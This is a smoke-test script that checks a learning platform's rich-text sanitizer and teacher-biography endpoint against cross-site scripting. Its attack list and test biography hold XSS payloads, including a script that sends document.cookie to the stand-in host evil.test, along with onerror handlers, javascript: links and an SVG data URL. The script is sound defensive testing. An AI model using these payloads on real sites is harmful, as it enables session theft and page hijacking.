/**
 * Cleaning the HTML that admins and teachers write.
 *
 *   npx tsx scripts/smoke-rich-text.mts
 *
 * Three fields are stored as HTML and rendered as HTML: a course's
 * description, an article's body, and a teacher's biography. The biography is
 * the one that matters — a teacher edits their own through `/me/profile`, and
 * it is shown on the public course page to every visitor, so an unfiltered one
 * would let the least privileged account on the system put a script into a
 * page everybody reads.
 *
 * The first half checks the filter itself against the attacks it exists for.
 * The second half sends them through the real endpoint, because a filter that
 * works and is not wired up protects nothing.
 *
 * Makes its own teacher and deletes them again.
 */
import { eq, sql } from 'drizzle-orm'
import { db } from '../src/db/client'
import { cleanRichText, plainText } from '../src/lib/rich-text'
import { teacherProfiles, users } from '../src/db/schema/index'

const API = process.env.API ?? 'http://127.0.0.1:3000/api/v1'

let failed = 0
function check(name: string, ok: boolean, detail = '') {
  console.log(`${ok ? 'ok  ' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`)
  if (!ok) failed += 1
}

async function call(path: string, init: RequestInit = {}, token?: string) {
  const res = await fetch(API + path, {
    ...init,
    headers: {
      ...(init.body === undefined ? {} : { 'Content-Type': 'application/json; charset=utf-8' }),
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
  })
  return { status: res.status, body: res.status === 204 ? null : await res.json() }
}

/* ---------------- 1. the filter itself ---------------- */

console.log('--- what it strips ---')

const ATTACKS: [string, string][] = [
  ['a script tag', '<p>hello</p><script>alert(1)</script>'],
  ['a script with its own text', '<script>fetch("//evil.test?c="+document.cookie)</script>'],
  ['an image that runs on failure', '<img src=x onerror="alert(1)">'],
  ['an inline handler on a paragraph', '<p onclick="alert(1)">tap me</p>'],
  ['a javascript: link', '<a href="javascript:alert(1)">click</a>'],
  ['a data: URL, which can carry an SVG, which can carry a script', '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">'],
  ['an iframe', '<iframe src="//evil.test"></iframe>'],
  ['a style sheet', '<style>body{display:none}</style>'],
  ['a sheet laid over the page', '<p style="position:fixed;inset:0;z-index:9999">gotcha</p>'],
  ['a background image that reports who read it', '<p style="background:url(//evil.test/pixel)">text</p>'],
  ['an svg with a script inside it', '<svg><script>alert(1)</script></svg>'],
  ['a form that posts somewhere else', '<form action="//evil.test"><input name="p" type="password"></form>'],
]

for (const [what, html] of ATTACKS) {
  const clean = cleanRichText(html) ?? ''
  const safe =
    !/<script|<iframe|<style|<form|<svg|onerror|onclick|javascript:|data:image\/svg/i.test(clean)
  check(what, safe, safe ? '' : clean.slice(0, 80))
}

console.log('\n--- what it keeps ---')

const KEEP: [string, string][] = [
  ['paragraphs', '<p>one</p><p>two</p>'],
  ['bold and italic', '<p><strong>bold</strong> and <em>italic</em></p>'],
  ['headings', '<h2>A heading</h2>'],
  ['lists', '<ul><li>one</li><li>two</li></ul>'],
  ['block quotes', '<blockquote><p>quoted</p></blockquote>'],
  ['tables', '<table><tbody><tr><td>cell</td></tr></tbody></table>'],
  ['an ordinary link', '<p><a href="https://example.com">a link</a></p>'],
  ['a mailto link', '<p><a href="mailto:hi@example.com">write to us</a></p>'],
  ['an uploaded picture', '<figure class="image"><img src="/api/v1/media/minna/content/x.png" alt="a photo"></figure>'],
]

for (const [what, html] of KEEP) {
  const clean = cleanRichText(html) ?? ''
  const tag = html.match(/<([a-z0-9]+)/i)?.[1] ?? ''
  check(what + ' survive', clean.includes(`<${tag}`), clean.slice(0, 70))
}

check(
  'the aspect ratio the editor writes, so the page does not jump',
  (cleanRichText('<img src="/x.png" style="aspect-ratio:562/871;">') ?? '').includes('aspect-ratio'),
)
check(
  '  but not a width that is really an expression',
  !(cleanRichText('<img src="/x.png" style="width:calc(100vw - 2px)">') ?? '').includes('calc'),
)
check(
  'a link opening in a new tab cannot reach back through window.opener',
  (cleanRichText('<a href="https://x.test" target="_blank">x</a>') ?? '').includes('noopener'),
)

console.log('\n--- empty is empty ---')
check('nothing at all', cleanRichText(null) === null)
check('an editor left empty', cleanRichText('<p></p>') === null, String(cleanRichText('<p></p>')))
check('whitespace only', cleanRichText('<p> </p><p><br></p>') === null)
check('a picture with no words is still content', cleanRichText('<p><img src="/x.png"></p>') !== null)
check('plain text drops the markup', plainText('<p>one</p><p>two</p>') === 'one two', plainText('<p>one</p><p>two</p>'))

/* ---------------- 2. through the real endpoint ---------------- */

console.log('\n--- through /me/teacher-profile, as a teacher ---')

const password = 'Str0ng-Pass!2026'
const email = `smoke-richtext-${Date.now()}@example.com`

const made = await call('/auth/register', {
  method: 'POST',
  body: JSON.stringify({
    email,
    password,
    firstName: 'ทด',
    lastName: 'สอบ',
    birthdate: '1990-01-15',
    acceptedTerms: true,
    locale: 'th',
    memberType: 'student',
  }),
})
const userId = made.body.user.id as number
await db.execute(sql`
  INSERT INTO user_roles (user_id, role_id) SELECT ${userId}, id FROM roles WHERE name = 'teacher'
`)
const login = await call('/auth/login', {
  method: 'POST',
  body: JSON.stringify({ email, password }),
})
const token = login.body.accessToken as string

/**
 * A teacher's public page is created by an administrator, who gives it its web
 * address; `PUT /me/teacher-profile` edits one that already exists and 404s
 * otherwise. Made directly here because the subject of this test is the
 * biography, not the paperwork around it.
 */
const slug = `smoke-richtext-${Date.now()}`
await db.execute(sql`
  INSERT INTO teacher_profiles (user_id, slug, display_name, short_name, listed)
  VALUES (${userId}, ${slug}, 'Smoke Teacher', 'Smoke', 0)
`)

try {
  const nasty =
    '<p>I teach German.</p><script>fetch("//evil.test?c="+document.cookie)</script><img src=x onerror="alert(1)">'

  const saved = await call(
    '/me/teacher-profile',
    {
      method: 'PUT',
      body: JSON.stringify({
        displayName: 'Smoke Teacher',
        shortName: 'Smoke',
        bio: nasty,
      }),
    },
    token,
  )
  check('a teacher can save a biography', saved.status === 200, String(saved.status))

  // Read it back from the database, not from the response: what is stored is
  // what every other reader will be given.
  const [row] = await db
    .select({ bio: teacherProfiles.bio })
    .from(teacherProfiles)
    .where(eq(teacherProfiles.userId, userId))
  const stored = row?.bio ?? ''

  check('  the script is not stored', !/<script/i.test(stored), stored.slice(0, 90))
  check('  nor the handler that fires on a broken image', !/onerror/i.test(stored), stored.slice(0, 90))
  check('  and the words they actually wrote are kept', stored.includes('I teach German'), stored.slice(0, 90))

  // The whole point: this is the field the public course page renders as HTML.
  check(
    '  so nothing dangerous reaches the page that shows it',
    !/<script|onerror|javascript:/i.test(stored),
  )

  const cleared = await call(
    '/me/teacher-profile',
    {
      method: 'PUT',
      body: JSON.stringify({
        displayName: 'Smoke Teacher',
        shortName: 'Smoke',
        bio: '<p> </p>',
      }),
    },
    token,
  )
  check('an emptied editor clears the biography', cleared.status === 200, String(cleared.status))
  const [after] = await db
    .select({ bio: teacherProfiles.bio })
    .from(teacherProfiles)
    .where(eq(teacherProfiles.userId, userId))
  check(
    '  stored as nothing, not as an empty paragraph',
    !after?.bio,
    JSON.stringify(after?.bio),
  )
} finally {
  await db.delete(teacherProfiles).where(eq(teacherProfiles.userId, userId))
  await db.delete(users).where(eq(users.id, userId))
}

console.log(failed ? `\n  ${failed} failing\n` : '\n  all good\n')
process.exit(failed ? 1 : 0)
